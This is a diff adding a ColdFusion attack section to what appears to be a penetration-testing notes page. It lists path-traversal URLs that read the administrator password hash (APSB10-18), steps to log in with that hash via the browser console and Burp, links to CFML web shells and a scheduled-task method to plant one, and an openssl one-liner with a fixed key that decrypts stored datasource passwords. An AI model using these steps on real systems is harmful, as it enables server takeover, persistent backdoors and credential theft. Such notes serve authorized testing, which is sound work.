@@ -44,7 +44,55 @@ Test Strategy:
 * Older versions you can try to upload and run ASP or ASPX files
 * Upload client-side code for client-side attack (e.g., XSS)
 
+> **Coldfusion**
 
+**ColdFusion 6, 7, 8 (APSB10-18) - Authentication Bypass**
+
+In unpatched versions of ColdFusion 6, 7 and 8 there is a local file inclusion vulnerability (APSB10-18) which you can exploit to get the administrator password hash from the password.properties file.
+
+ColdFusion 6:
+<code> http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%en </code>
+
+ColdFusion 7: 
+<code> http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%en </code>
+
+ColdFusion 8:
+<code> http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en </code>
+
+All versions (according to this site [3], but I have never tried it):
+<code> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%en </code>
+
+If the local file inclusion is successful, the password hash (SHA1) is written back to you on the administrative login page like this (hash was reducted):
+
+Here are the steps you need to take in order to login as administrator:
+* Start capturing traffic using Burp (or whatever attack proxy you like).
+* Enter the password hash into the password field of the login form.
+* If you are using Firefox hit Ctrl+Shift+K, for Chrome, hit Ctrl+Shift+J to get the JavaScript console and if you are using Internet Explorer
+* Enter the following JavaScript code in the console:
+<code> javascript:alert(hex_hmac_sha1(document.loginform.salt.value, document.loginform.cfadminPassword.value)) </code>
+* Record value that you got, and go back with your browser back button.
+* Set Burp to intercept, click on the Login button at ClodFusion and catch the login request in Burp.
+* Replace the value of the cfadminPassword parameter with the value you have recorded above.
+* Forward the modified request and do your happy dance.
+
+**Webshell**
+
+Download a the webshell of choice:
+https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors/cfm
+https://github.com/hatRiot/clusterd/blob/master/src/lib/coldfusion/fuze.cfml
+
+"Debugging & Loging / Scheduled Taks" menu element and add a scheduled task that would download our CFML script from our webserver to the ColdFusion server’s webroot. Make sure you schedule the deployment to some reasonable time, so 5-10 minutes from your current time
+
+
+**Database Passwords**
+
+For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files:
+<code> [ColdFusion_Install_Dir]\lib\neo-query.xml </code>
+For ColdFusion 8, 9 and 10:
+<code> [ColdFusion_Install_Dir]\lib\neo-datasource.xml </code>
+
+Decrypt the Password for 6,7, and 8:
+<code> echo [encrypted_and_base64_encoded_password] | openssl des-ede3 -a -d -K 30794A21403124723870304C4072312436794A214031726A -iv 30794A2140312472; echo </code>
 
 > **Forced Browseing and Content Discovery**
 
@@ -211,3 +259,8 @@ Then you may be able to do something like:
 {% highlight bash %}
 curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php
 Welcome, authorized user!{% endhighlight %}
+
+
+**References**
+
+* https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html
